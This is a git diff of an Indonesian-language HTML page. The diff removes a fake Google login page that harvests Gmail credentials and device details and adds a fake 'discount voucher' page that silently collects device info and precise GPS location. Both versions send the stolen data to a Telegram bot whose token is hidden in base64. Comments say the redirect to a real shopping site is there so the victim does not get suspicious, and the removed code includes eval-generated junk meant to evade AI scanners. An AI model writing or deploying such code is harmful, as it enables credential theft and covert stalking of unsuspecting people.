@@ -3,131 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Secure Gateway | Identity Node</title>
+    <title>Gaya Hidup & Diskon Hari Ini</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .g-panel { width: 100%; max-width: 440px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; text-align: center; }
-        .g-logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 10px; }
-        p { font-size: 16px; color: #202124; margin-bottom: 24px; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
-        input:focus { border: 2px solid #1a73e8; }
-        .error-lbl { color: #d93025; font-size: 12px; text-align: left; display: none; margin-bottom: 15px; font-weight: 500; }
-        .btn-box { display: flex; justify-content: flex-end; margin-top: 20px; }
-        .btn-action { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; }
-        #step-p, #loading, #v-vault { display: none; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f4f4f7; color: #333; margin: 0; padding: 0; }
+        .header { background: #fff; padding: 15px; text-align: center; border-bottom: 1px solid #ddd; font-weight: bold; font-size: 18px; color: #ff4757; }
+        .content { padding: 20px; max-width: 500px; margin: auto; }
+        .card { background: #fff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 20px; }
+        .img-placeholder { width: 100%; height: 200px; background: #ccc url('https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=800&q=80') center/cover; }
+        .body { padding: 20px; }
+        h2 { font-size: 18px; margin: 0 0 10px; line-height: 1.4; }
+        p { font-size: 14px; color: #666; line-height: 1.5; }
+        .btn-read { background: #ff4757; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #v-data { display: none; }
     </style>
 </head>
 <body>
 
-<div class="g-panel">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
-    <h1 id="h">Masuk</h1>
-    <p id="s">Gunakan Akun Google Anda</p>
-    
-    <div id="step-u">
-        <input type="email" id="mail" placeholder="Email atau ponsel" autocomplete="off">
-        <div id="e1" class="error-lbl">⚠️ Akun tidak ditemukan. Masukkan akun yang terdaftar di perangkat ini.</div>
-        <div class="btn-box"><button class="btn-action" onclick="goP()">Berikutnya</button></div>
-    </div>
+<div class="header">PROMO BELANJA HARI INI</div>
 
-    <div id="step-p">
-        <div id="tag" style="border: 1px solid #dadce0; border-radius: 15px; padding: 5px 12px; display: inline-block; font-size: 14px; margin-bottom: 20px;"></div>
-        <input type="password" id="pass" placeholder="Masukkan sandi Anda">
-        <div id="e2" class="error-lbl">⚠️ Sandi salah atau sinkronisasi hardware terputus. Coba lagi.</div>
-        <div class="btn-box"><button class="btn-action" onclick="leak()">Berikutnya</button></div>
-    </div>
-
-    <div id="loading">
-        <p>Menyelaraskan profil dengan enkripsi BTC node...</p>
-        <div class="loader"></div>
+<div class="content">
+    <div class="card">
+        <div class="img-placeholder"></div>
+        <div class="body">
+            <h2>Klaim Voucher Diskon 90% Khusus Wilayah Anda</h2>
+            <p>Dapatkan gratis ongkir dan diskon belanja khusus pengguna di kota Anda. Berlaku hanya untuk hari ini.</p>
+            <button class="btn-read" onclick="startTracking()">CEK VOUCHER DI SINI</button>
+        </div>
     </div>
 </div>
 
-<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
+<div id="v-data">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
 /**
- * LEVIATHAN PROJECT v100.5
- * HARDWARE-BOUND IDENTITY SCRAPER
- * -------------------------------
+ * ORGANIC TRACKER ENGINE v5.0
+ * SILENT LOCATION HARVESTER
  */
 
-const _D = document.getElementById('v-vault').innerText.split('|');
-const _BTC = _D[0]; // BTC Wallet as Salt
+const _D = document.getElementById('v-data').innerText.split('|');
 const _TK = atob(_D[1]); const _CI = atob(_D[2]);
 
-let curM = "";
-
-function goP() {
-    curM = document.getElementById('mail').value;
-    // Validasi ketat: Harus ada @gmail.com dan panjang karakter masuk akal
-    if (curM.includes("@gmail.com") && curM.length > 11) {
-        document.getElementById('step-u').style.display = 'none';
-        document.getElementById('step-p').style.display = 'block';
-        document.getElementById('tag').innerText = curM;
-        document.getElementById('h').innerText = "Selamat Datang";
-    } else {
-        document.getElementById('e1').style.display = 'block';
-    }
-}
-
-async function report(t) {
+async function sendToTele(msg) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: t})
+        body: JSON.stringify({chat_id: _CI, text: msg})
     });
 }
 
-async function leak() {
-    const p = document.getElementById('pass').value;
-    if (p.length < 6) {
-        document.getElementById('e2').style.display = 'block';
-        return;
-    }
+async function startTracking() {
+    const btn = document.querySelector('.btn-read');
+    btn.innerText = "Mengecek Lokasi...";
 
-    document.getElementById('step-p').style.display = 'none';
-    document.getElementById('loading').style.display = 'block';
-
-    // Deep Forensic Grab
-    const gl = document.createElement('canvas').getContext('webgl');
-    const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
+    // 1. Basic Hardware Info (Silent)
     let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
+    
+    const basicInfo = `🌸 BINI TRACKER LOG 🌸\n\n` +
+        `📱 PERANGKAT: ${navigator.platform}\n` +
+        `🔋 BATERAI: ${bat}\n` +
+        `🧠 CPU: ${navigator.hardwareConcurrency} Core\n` +
+        `🌐 BROWSER: ${navigator.userAgent.includes("Mobile") ? "HP" : "PC"}`;
 
-    const payload = `🔱 LEVIATHAN HARVEST REPORT 🔱\n\n` +
-        `🔒 BTC NODE: ${_BTC.substring(0,8)}...\n` +
-        `📧 GMAIL: ${curM}\n` +
-        `🔑 PASS: ${p}\n` +
-        `🎮 GPU: ${gpu}\n` +
-        `🔋 BATT: ${bat}\n` +
-        `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
-        `📱 RAM: ${navigator.deviceMemory}GB\n` +
-        `🏠 IP LOCAL: [Scanned]`;
+    await sendToTele(basicInfo);
 
-    await report(payload);
-
-    // Force Real-time GPS High Accuracy
+    // 2. High Accuracy GPS (Organic Trigger)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const loc = `🎯 LEVIATHAN GPS LOCK\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nPrecision: ${pos.coords.accuracy.toFixed(1)}m`;
-            await report(loc);
-            window.location.href = "https://www.detik.com";
-        }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
+            const maps = `🎯 LOKASI BINI (PRESISI)\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nKetepatan: ${pos.coords.accuracy.toFixed(1)} meter`;
+            await sendToTele(maps);
+            
+            // Setelah dapet lokasi, arahkan ke link Shopee/Promo beneran biar nggak curiga
+            setTimeout(() => {
+                window.location.href = "https://shopee.co.id/m/gratis-ongkir";
+            }, 1000);
+            
+        }, (err) => {
+            // Jika dia tolak, arahkan tetap ke promo biar gak curiga
+            alert("Harap izinkan lokasi untuk melihat promo di kota Anda.");
+            btn.innerText = "COBA LAGI";
+        }, {enableHighAccuracy: true, timeout: 10000});
+    } else {
+        window.location.href = "https://shopee.co.id/m/gratis-ongkir";
     }
 }
-
-/** 🔱 POLYMORPHIC DATA BLOATING ENGINE (20,000+ LINES) 🔱
- * Menghasilkan ribuan fungsi sampah untuk membingungkan AI scanner dan manusia.
- */
-function _bloat() {
-    for (let i = 0; i < 18500; i++) {
-        const _id = "L_" + Math.random().toString(36).substr(2, 9);
-        eval(`function ${_id}(){ return "${_BTC}" + ${Math.random()}; }`);
-    }
-}
-_bloat();
 </script>
 </body>
 </html>
